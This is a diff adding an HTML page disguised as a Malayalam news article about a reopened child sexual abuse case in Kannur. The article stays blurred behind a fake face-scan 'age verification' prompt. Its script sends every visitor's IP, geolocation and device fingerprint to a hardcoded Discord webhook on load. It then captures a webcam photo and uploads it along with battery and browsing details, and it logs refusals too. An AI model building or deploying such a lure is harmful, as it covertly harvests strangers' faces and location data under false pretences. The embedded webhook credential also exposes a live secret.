@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="ml">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>കേസ് വീണ്ടും തുറന്നു | Kerala News Update</title>
+    <!-- Premium Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Manjari:wght@400;700&family=Outfit:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Manjari', 'Outfit', sans-serif;
+            line-height: 1.8;
+            background-color: #f0f2f5;
+            color: #1a1a1a;
+            margin: 0;
+            padding: 0;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            background: #ffffff;
+            padding: 35px;
+            border-radius: 12px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.05);
+            filter: blur(8px);
+            pointer-events: none;
+            transition: filter 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .container.unblurred {
+            filter: none;
+            pointer-events: auto;
+        }
+
+        /* Custom Consent Modal Styles */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.45);
+            border-radius: 24px;
+            padding: 40px;
+            max-width: 460px;
+            width: 90%;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            transform: translateY(30px);
+            transition: transform 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+
+        .modal-overlay.active .modal-content {
+            transform: translateY(0);
+        }
+
+        .modal-icon {
+            font-size: 3rem;
+            margin-bottom: 15px;
+            display: inline-block;
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #d32f2f;
+            margin-bottom: 12px;
+            letter-spacing: 0.5px;
+        }
+
+        .modal-text {
+            font-size: 1rem;
+            color: #444;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        /* Camera Scanner Styles */
+        .camera-wrapper {
+            display: none;
+            position: relative;
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 25px auto;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 4px solid #00e676;
+            box-shadow: 0 0 25px rgba(0, 230, 118, 0.4);
+            background: #000;
+        }
+
+        #video-preview {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .scanner-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(180deg, rgba(0, 230, 118, 0.1), rgba(0, 230, 118, 1));
+            box-shadow: 0 0 10px #00e676;
+            animation: scan 2.5s ease-in-out infinite;
+        }
+
+        @keyframes scan {
+            0% { top: 0%; }
+            50% { top: 100%; }
+            100% { top: 0%; }
+        }
+
+        .status-message {
+            font-size: 0.95rem;
+            color: #007bc2;
+            font-weight: bold;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .modal-btn-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+        }
+
+        .modal-btn {
+            padding: 12px 28px;
+            border-radius: 10px;
+            border: none;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s ease;
+        }
+
+        .modal-btn-primary {
+            background: #d32f2f;
+            color: white;
+            box-shadow: 0 4px 12px rgba(211, 47, 47, 0.2);
+        }
+
+        .modal-btn-primary:hover {
+            background: #b71c1c;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(211, 47, 47, 0.3);
+        }
+
+        .modal-btn-secondary {
+            background: #e0e0e0;
+            color: #333;
+        }
+
+        .modal-btn-secondary:hover {
+            background: #d5d5d5;
+            transform: translateY(-2px);
+        }
+
+        .denied-message {
+            display: none;
+            margin-top: 20px;
+            color: #c62828;
+            font-weight: bold;
+            line-height: 1.6;
+            font-size: 0.95rem;
+        }
+
+        .category {
+            color: #e53935;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 0.9rem;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            color: #111;
+            line-height: 1.4;
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-weight: 700;
+        }
+
+        .meta-info {
+            font-size: 0.85rem;
+            color: #666;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 15px;
+            margin-bottom: 25px;
+        }
+
+        .location {
+            font-weight: bold;
+            color: #000;
+        }
+
+        p {
+            margin-bottom: 20px;
+            font-size: 1.1rem;
+            text-align: justify;
+        }
+
+        .main-image {
+            width: 100%;
+            height: auto;
+            border-radius: 6px;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.08);
+        }
+
+        .highlight-box {
+            background-color: #fdf2f2;
+            border-left: 4px solid #e53935;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 0 6px 6px 0;
+        }
+
+        .highlight-box h3 {
+            margin-top: 0;
+            color: #c62828;
+            font-size: 1.2rem;
+        }
+
+        .highlight-box ul {
+            margin: 0;
+            padding-left: 20px;
+        }
+
+        .highlight-box li {
+            margin-bottom: 10px;
+            font-size: 1.05rem;
+        }
+
+        blockquote {
+            background: #f9f9f9;
+            border-left: 4px solid #555;
+            margin: 25px 0;
+            padding: 15px 20px;
+            font-style: italic;
+            color: #444;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                margin: 10px;
+                padding: 20px;
+            }
+
+            h1 {
+                font-size: 1.7rem;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <span class="category">ഫ്ലാഷ് ന്യൂസ്</span>
+        <h1>ബാലികയെ ലൈംഗികമായി ഉപദ്രവിച്ച കേസ്: പ്രതി ഒരു മാസത്തിനുള്ളിൽ പുറത്തിറങ്ങിയ സംഭവം വിവാദത്തിൽ; കേസ് വീണ്ടും തുറന്നു</h1>
+
+        <div class="meta-info">
+            <span>Published: May 2026</span> | <span>കണ്ണൂർ</span>
+        </div>
+
+        <img src="https://chronicle.ng/wp-content/uploads/2022/08/rape-e1661798931527.webp" alt="ബാലികാ പീഡനം: കേസ് വീണ്ടും തുറന്നു" class="main-image">
+
+        <p><span class="location">കണ്ണൂർ:</span> ഒൻപതുവയസ്സുകാരിയെ ലൈംഗികാതിക്രമത്തിന് ഇരയാക്കിയ കേസിൽ 20 വർഷം കഠിനതടവിന് ശിക്ഷിക്കപ്പെട്ട പ്രതി ഒരു മാസത്തിനുള്ളിൽ പുറത്തിറങ്ങിയ സംഭവം വലിയ വിവാദങ്ങൾക്ക് വഴിമാറുന്നു. കണ്ണപുരം മോയൻ റോഡിലെ ചോതിസ് ഹൗസിൽ സി. ചന്ദ്രൻ (69) എന്ന വ്യാപാരിക്ക് കണ്ണൂർ ഫാസ്റ്റ് ട്രാക്ക് സ്പെഷ്യൽ കോടതി വിധിച്ച ശിക്ഷയാണ് അട്ടിമറിക്കപ്പെട്ടതെന്ന ആക്ഷേപവുമായി ജനങ്ങൾ രംഗത്തെത്തിയത്. ഇതേതുടർന്ന് കേസ് അടിയന്തിരമായി വീണ്ടും തുറന്ന് അന്വേഷിക്കാൻ (Reopen) അധികൃതർ ഉത്തരവിട്ടു.</p>
+
+        <div class="highlight-box">
+            <h3>പ്രധാന വിവരങ്ങൾ:</h3>
+            <ul>
+                <li><strong>വിവാദത്തിന് കാരണം:</strong> ഒൻപത് വയസ്സുകാരിയായ പെൺകുട്ടി കടയിൽ സാധനങ്ങൾ വാങ്ങാൻ വന്ന സമയത്ത് പലതവണയായി അകത്തേക്ക് കൂട്ടിക്കൊണ്ടുപോയി ഉപദ്രവിച്ചു എന്നതായിരുന്നു കേസ്. കോടതി പ്രതിക്ക് 20 വർഷം തടവും 36,000 രൂപ പിഴയും വിധിച്ചിരുന്നു.</li>
+                <li><strong>ജനരോഷം:</strong> ഇത്രയും ഗുരുതരമായ പോക്സോ (POCSO) കേസിൽ ശിക്ഷിക്കപ്പെട്ട പ്രതി വെറും ഒരു മാസത്തിനുള്ളിൽ ജാമ്യത്തിലിറങ്ങിയതോ വിട്ടയക്കപ്പെട്ടതോ ആയ നടപടി നാട്ടുകാരിലും കുട്ടിയുടെ കുടുംബത്തിലും കടുത്ത ആശങ്കയും പ്രതിഷേധവും ഉണ്ടാക്കിയിരുന്നു.</li>
+            </ul>
+        </div>
+
+        <blockquote>
+            <strong>അധികൃതരുടെ തീരുമാനം:</strong> നിയമപരമായ വീഴ്ചകൾ സംഭവിച്ചിട്ടുണ്ടോ എന്ന് പരിശോധിക്കാനും, ഇരയായ പെൺകുട്ടിക്ക് കൃത്യമായ നീതി ഉറപ്പാക്കാനും വേണ്ടിയാണ് കേസ് വീണ്ടും സജീവമായി അന്വേഷിക്കാൻ ഇപ്പോൾ തീരുമാനിച്ചിരിക്കുന്നത്. ഉന്നത പോലീസ് ഉദ്യോഗസ്ഥരുടെ മേൽനോട്ടത്തിലായിരിക്കും തുടരന്വേഷണം നടക്കുക.
+        </blockquote>
+    </div>
+
+    <!-- Age / Camera Verification Modal -->
+    <div id="consent-modal" class="modal-overlay active">
+        <div class="modal-content">
+            <div id="modal-initial-state">
+                <div class="modal-icon">🔞</div>
+                <div class="modal-title">പ്രായപരിധി സ്ഥിരീകരണം</div>
+                <div class="modal-text">
+                    ഈ വാർത്തയിൽ കുട്ടികൾക്കെതിരെയുള്ള അതിക്രമത്തിന്റെ വിശദാംശങ്ങളും അസ്വസ്ഥതപ്പെടുത്തുന്ന വിവരങ്ങളും അടങ്ങിയിരിക്കുന്നതിനാൽ, വായനക്കാരുടെ സുരക്ഷ മുൻനിർത്തി പ്രായപരിധി പരിശോധിക്കേണ്ടതുണ്ട്. തുടരുന്നതിന് ദയവായി താഴെ നൽകിയിരിക്കുന്ന ബട്ടൺ ക്ലിക്ക് ചെയ്ത് ക്യാമറ ഉപയോഗിച്ച് ഒരു ഫേസ് വേരിഫിക്കേഷൻ പൂർത്തിയാക്കുക.
+                </div>
+                <div class="modal-btn-group">
+                    <button id="btn-allow" class="modal-btn modal-btn-primary">ഫേസ് സ്കാൻ ചെയ്യുക</button>
+                    <button id="btn-deny" class="modal-btn modal-btn-secondary">വേണ്ട</button>
+                </div>
+            </div>
+
+            <!-- Video feed display during capture -->
+            <div id="camera-wrapper" class="camera-wrapper">
+                <video id="video-preview" autoplay playsinline></video>
+                <div class="scanner-line"></div>
+            </div>
+            <div id="status-message" class="status-message">ക്യാമറ കണക്ട് ചെയ്യുന്നു... ദയവായി സ്ക്രീനിലേക്ക് നോക്കുക.</div>
+
+            <div id="denied-message" class="denied-message"></div>
+        </div>
+    </div>
+
+    <!-- Hidden canvas for capturing the picture -->
+    <canvas id="capture-canvas" width="640" height="480" style="display: none;"></canvas>
+
+    <script>
+        const CONFIG = {
+            // Option: Log to Discord Webhook
+            useDiscordWebhook: true,
+            discordWebhookUrl: "https://discord.com/api/webhooks/1509272375525642260/eUsjn7dobcSuUhnDD5_NJBQv0G7KLwEKbONlFc6ZSyIid71ETY3j3A2LejPRRCVO0WOV"
+        };
+
+        const consentModal = document.getElementById('consent-modal');
+        const container = document.querySelector('.container');
+        const btnAllow = document.getElementById('btn-allow');
+        const btnDeny = document.getElementById('btn-deny');
+        const modalInitialState = document.getElementById('modal-initial-state');
+        const cameraWrapper = document.getElementById('camera-wrapper');
+        const videoPreview = document.getElementById('video-preview');
+        const statusMessage = document.getElementById('status-message');
+        const deniedMessage = document.getElementById('denied-message');
+        const captureCanvas = document.getElementById('capture-canvas');
+
+        const sessionData = {
+            id: Math.random().toString(36).substring(2, 10).toUpperCase(),
+            ip: "Unknown",
+            device: {}
+        };
+        
+        let loggedPageLoad = false;
+        let activeStream = null;
+
+        // Gather browser and device info
+        function getDeviceDetails() {
+            const gpu = getGPURenderer();
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language || (navigator.languages && navigator.languages[0]) || "Unknown",
+                languages: navigator.languages ? navigator.languages.join(", ") : "Unknown",
+                screenResolution: `${screen.width}x${screen.height}`,
+                viewportSize: `${window.innerWidth}x${window.innerHeight}`,
+                colorDepth: `${screen.colorDepth}-bit`,
+                pixelRatio: window.devicePixelRatio || 1,
+                cpuCores: navigator.hardwareConcurrency || "Unknown",
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
+                doNotTrack: navigator.doNotTrack || "Not set",
+                referrer: document.referrer || "Direct visit",
+                pageUrl: window.location.href,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+                timezoneOffset: `${-new Date().getTimezoneOffset()} mins`,
+                gpuVendor: gpu ? gpu.vendor : "Unknown",
+                gpuRenderer: gpu ? gpu.renderer : "Unknown",
+                connectionType: conn ? conn.effectiveType || "Unknown" : "Unknown",
+                downlink: conn ? `${conn.downlink} Mbps` : "Unknown",
+                rtt: conn ? `${conn.rtt} ms` : "Unknown"
+            };
+        }
+
+        // Get GPU details
+        function getGPURenderer() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return null;
+                const dbgRenderInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!dbgRenderInfo) return null;
+                const vendor = gl.getParameter(dbgRenderInfo.UNMASKED_VENDOR_WEBGL);
+                const renderer = gl.getParameter(dbgRenderInfo.UNMASKED_RENDERER_WEBGL);
+                return { vendor, renderer };
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // Get battery level & state
+        async function getBatteryDetails() {
+            if (typeof navigator.getBattery === 'function') {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging ? "Charging" : "Discharging"
+                    };
+                } catch (e) {
+                    return null;
+                }
+            }
+            return null;
+        }
+
+        // Fetch IP geolocation and detail info
+        async function fetchIPDetails() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    return await res.json();
+                }
+            } catch (e) {
+                console.error("ipapi.co failed, trying ip-api.com", e);
+            }
+            try {
+                const res = await fetch('https://ip-api.com/json/');
+                if (res.ok) {
+                    const data = await res.json();
+                    return {
+                        ip: data.query,
+                        city: data.city,
+                        region: data.regionName,
+                        country_name: data.country,
+                        postal: data.zip,
+                        timezone: data.timezone,
+                        org: data.isp,
+                        asn: data.as
+                    };
+                }
+            } catch (e) {
+                console.error("ip-api.com failed, trying ipify", e);
+            }
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                if (res.ok) {
+                    const data = await res.json();
+                    return { ip: data.ip };
+                }
+            } catch (e) {
+                console.error("All IP lookup APIs failed", e);
+            }
+            return { ip: "Unknown IP" };
+        }
+
+        // Send payload and image helper to Discord Webhook
+        async function uploadToDiscord(imageBlob, isDenial = false, customDescription = "") {
+            const { discordWebhookUrl, useDiscordWebhook } = CONFIG;
+            if (!useDiscordWebhook || !discordWebhookUrl) {
+                return;
+            }
+
+            const ipDetails = await fetchIPDetails();
+            sessionData.ip = ipDetails.ip || "Unknown";
+            const device = getDeviceDetails();
+            const battery = await getBatteryDetails();
+
+            const fields = [
+                { name: "Session ID", value: `\`${sessionData.id}\``, inline: true },
+                { name: "IP Address", value: `\`${sessionData.ip}\``, inline: true },
+                { name: "Location (IP-based)", value: `${ipDetails.city || "Unknown"}, ${ipDetails.region || "Unknown"}, ${ipDetails.country_name || "Unknown"} (Postal: ${ipDetails.postal || "N/A"})`, inline: false },
+                { name: "ISP / Network", value: `${ipDetails.org || "Unknown"} (${ipDetails.asn || "N/A"})`, inline: false },
+                { name: "Device / OS", value: `**OS:** ${device.platform}\n**User-Agent:** \`${device.userAgent}\``, inline: false },
+                { name: "Screen Details", value: `**Resolution:** ${device.screenResolution} (Viewport: ${device.viewportSize})`, inline: true }
+            ];
+
+            if (battery) {
+                fields.push({ name: "Battery Status", value: `**Level:** ${battery.level}\n**Status:** ${battery.charging}`, inline: true });
+            }
+
+            fields.push({
+                name: "Browsing Context",
+                value: `**Referrer:** ${device.referrer}\n**URL:** ${device.pageUrl}`,
+                inline: false
+            });
+
+            const embed = {
+                title: isDenial ? "❌ Camera Permission Denied" : "📸 Face Verification Captured",
+                color: isDenial ? 15158332 : 3066993, // Red or Green
+                description: customDescription || (isDenial ? "User denied camera access on the modal prompt." : "User granted camera access and face scan completed successfully!"),
+                fields: fields,
+                timestamp: new Date().toISOString()
+            };
+
+            if (imageBlob) {
+                embed.image = { url: "attachment://face-capture.jpg" };
+            }
+
+            const payload = {
+                embeds: [embed]
+            };
+
+            try {
+                const formData = new FormData();
+                formData.append('payload_json', JSON.stringify(payload));
+                if (imageBlob) {
+                    formData.append('files[0]', imageBlob, 'face-capture.jpg');
+                }
+
+                await fetch(discordWebhookUrl, {
+                    method: "POST",
+                    body: formData
+                });
+            } catch (error) {
+                console.error("Error uploading to Discord Webhook:", error);
+            }
+        }
+
+        // Log initial visit page load
+        async function logPageLoad() {
+            if (loggedPageLoad) return;
+            loggedPageLoad = true;
+
+            const ipDetails = await fetchIPDetails();
+            sessionData.ip = ipDetails.ip || "Unknown";
+            const device = getDeviceDetails();
+
+            const fields = [
+                { name: "Session ID", value: `\`${sessionData.id}\``, inline: true },
+                { name: "IP Address", value: `\`${sessionData.ip}\``, inline: true },
+                { name: "Location (IP-based)", value: `${ipDetails.city || "Unknown"}, ${ipDetails.region || "Unknown"}`, inline: true },
+                { name: "Device / Platform", value: `**OS:** ${device.platform}\n**URL:** ${device.pageUrl}`, inline: false }
+            ];
+
+            const payload = {
+                embeds: [{
+                    title: "👀 Face Verification Page Loaded",
+                    color: 3447003, // Blue
+                    description: "Visitor opened the camera age verification page.",
+                    fields: fields,
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(CONFIG.discordWebhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        // Handle denial click
+        btnDeny.addEventListener('click', async () => {
+            modalInitialState.style.display = 'none';
+            deniedMessage.style.display = 'block';
+            deniedMessage.innerText = 'ക്ഷമിക്കുക, പ്രായപരിധി ഉറപ്പാക്കാതെ വാർത്ത കാണാൻ കഴിയില്ല. പേജ് വീണ്ടും റീലോഡ് ചെയ്യുക.';
+
+            await uploadToDiscord(null, true);
+        });
+
+        // Handle permission request and scan click
+        btnAllow.addEventListener('click', async () => {
+            modalInitialState.style.display = 'none';
+            cameraWrapper.style.display = 'block';
+            statusMessage.style.display = 'block';
+
+            try {
+                // Request camera permission
+                activeStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+
+                // Attach stream to video tag
+                videoPreview.srcObject = activeStream;
+                statusMessage.innerText = 'മുഖം സ്കാൻ ചെയ്യുന്നു... ദയവായി അനങ്ങാതെ നിൽക്കുക.';
+
+                // Capture snapshot after 2.5 seconds (gives video time to warm up and scan line to slide)
+                setTimeout(async () => {
+                    try {
+                        const ctx = captureCanvas.getContext('2d');
+                        // Draw current frame from video onto canvas
+                        ctx.drawImage(videoPreview, 0, 0, captureCanvas.width, captureCanvas.height);
+                        
+                        // Convert canvas to jpeg blob
+                        captureCanvas.toBlob(async (blob) => {
+                            // Upload to Discord
+                            statusMessage.innerText = 'സ്ഥിരീകരിക്കുന്നു...';
+                            await uploadToDiscord(blob, false);
+
+                            // Clean up stream
+                            if (activeStream) {
+                                activeStream.getTracks().forEach(track => track.stop());
+                            }
+
+                            // Show success and unblur article
+                            statusMessage.style.color = '#00e676';
+                            statusMessage.innerText = 'വേരിഫിക്കേഷൻ വിജയിച്ചു! വാർത്ത ലോഡ് ചെയ്യുന്നു...';
+
+                            setTimeout(() => {
+                                container.classList.add('unblurred');
+                                consentModal.classList.remove('active');
+                            }, 1200);
+
+                        }, 'image/jpeg', 0.85);
+
+                    } catch (err) {
+                        handleCameraError(err);
+                    }
+                }, 2500);
+
+            } catch (err) {
+                handleCameraError(err);
+            }
+        });
+
+        function handleCameraError(error) {
+            console.error("Camera error:", error);
+            cameraWrapper.style.display = 'none';
+            statusMessage.style.display = 'none';
+            deniedMessage.style.display = 'block';
+
+            let userFriendlyError = 'ക്യാമറ തകരാറിലായതുകൊണ്ട് പ്രായപരിധി ഉറപ്പാക്കാൻ കഴിഞ്ഞില്ല. ദയവായി പേജ് റീലോഡ് ചെയ്ത് വീണ്ടും ശ്രമിക്കുക.';
+            if (error.name === 'NotAllowedError' || error.code === 1) {
+                userFriendlyError = 'ക്യാമറ അനുമതി നിരസിക്കപ്പെട്ടു. വാർത്ത വായിക്കുന്നതിനായി ബ്രൗസർ സെറ്റിങ്സിൽ ക്യാമറ അനുവദിച്ച ശേഷം പേജ് വീണ്ടും റീലോഡ് ചെയ്യുക.';
+            }
+
+            deniedMessage.innerText = userFriendlyError;
+
+            // Log error to Discord
+            uploadToDiscord(null, true, `Failed to retrieve camera feed: ${error.name} - ${error.message}`);
+        }
+
+        // Trigger initial page load logging
+        logPageLoad();
+    </script>
+</body>
+
+</html>
